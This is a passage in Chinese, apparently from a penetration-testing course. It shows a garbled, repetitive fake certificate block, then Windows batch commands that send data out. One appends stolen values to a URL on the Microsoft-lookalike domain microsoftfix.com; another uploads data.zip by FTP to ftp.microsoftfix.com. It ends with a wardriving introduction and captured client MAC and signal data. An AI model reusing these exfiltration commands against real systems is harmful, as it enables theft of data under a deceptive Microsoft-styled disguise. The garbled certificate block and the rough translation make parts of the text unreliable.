
```
---BEGIN CERTIFICATE---
UEIB3BQAAAIQ+J+Bo8k6CvvQGEaGAIAAAAAAAAAGGYFSB0mHTVFzAUFa7g
PA4xWkK73Dc3Z40MlKr55VVKt9b996KjZrNr11S13B3UF9CknnHvPbbc5heFL
nnWleWkU47Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6
nnWWktYYIS5F3e3et33Gs31m0WQZ20eId4m2Id1mplx22Fv6R6K+EL
tYAAtHwLrk
SADB04jK72Z4Q0p160buJ21ml006+KvvXh22+22mN52XppvInAg6


kt
IS5F33333333100020042222112222266666



---END CERT
```

你只需要存储此输出并将其传递给 URL

```
type variable.txt > tmpFile
set /p value=<tmpFile
del tmpFile

"C:\Program Files\Internet Explorer\iexplore.exe microsoftfix.com/!value!"
```

或者直接发送文件并使用 `certutil -decode` 函数解码内容。

#### b. 通过 FTP 发送 zip 文件

使用 CERTUTIL 或通过 FTP 发送 zip 文件

在 Linux 上安装并配置 FTP 服务器以接收文件

```
apt install vsftpd
```

将用户名设置为 "`fix`"，密码留空

```batch
@echo off
echo user fix@microsoft.com > ftpcmd.dat
echo fixtest>> ftpcmd.dat
echo put "C:\%TEMPDIR%\data.zip">> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat ftp.microsoftfix.com
del ftpcmd.dat
```

这将将 `data.zip` 文件直接发送到我们的 FTP 服务器。

你现在可以测试你的设置了。

作业？

按工作顺序组织文件并攻克它们吧！

现在可能需要一些时间来组织，但值得学习。

不要忘记在 `members.rootsh3ll.com` 分享你的经验并提问所有相关问题。

## Wi-Fi 攻击

[附录]

## 无线钓车：简介

**war driving**（无线钓车），也称为接入点映射，是在城市或其他地方**驾驶**时，寻找、定位并可能利用无线局域网连接的行为。

这里没有任何“攻击”，但它可以用于远程 Wi-Fi“攻击”，以知道该将定向天线指向哪里。

如果已经有相关内容而我漏掉了，我深表歉意。

根据信号强度以及记录的每个强度对应的 GPS 位置，计算 AP 的近似位置，这些是在我们带有同步 GPS 设备的 Wi-Fi 设备驾驶/行走时获取（捕捉）的。

### 计算接入点位置

![](img/ac8a7ada56be8fa0ece47a14bb6f46cd_183_0.png)

在我们的数据库中，带有捕获的对（坐标，功率强度）和其他数据的首位是位置。

`/pyemon.py -f -r -l -i wlan0`

| Unix 时间戳 | MAC 地址 | rssi | SSID |
| :--- | :--- | :--- | :--- |
| 150026780 | 04:56:94:dc:6a | -75 | Gionee Communication Equipment Co.,Ltd. |
| 150026780 | 2c:33:61:3a:4c:2f | -21 | Apple, Inc. |
| 150026781 | 08:e9:a4:dc:72 | -71 | Foxconn(Nanjing) Communication Co.,Ltd. |
| 150026782 | 34:bb:26:f6:04:b9 | -75 | Motorola Mobility LLC, a Lenovo Company |
| 150026785 | 88:28:b3:a6:5c:40 | -71 | HUAWEI TECHNOLOGIES CO.,LTD. |
| 150026786 | 04:56:94:dc:6a | -75 | Gionee Communication Equipment Co.,Ltd. |

# Beacon own输出:

- 第 1 列：Unix 时间戳

- 第 2 列：探测设备的 MAC 地址（客户端，而非路由器）

- 第 3 列：接收信号强度指示 (rssi)
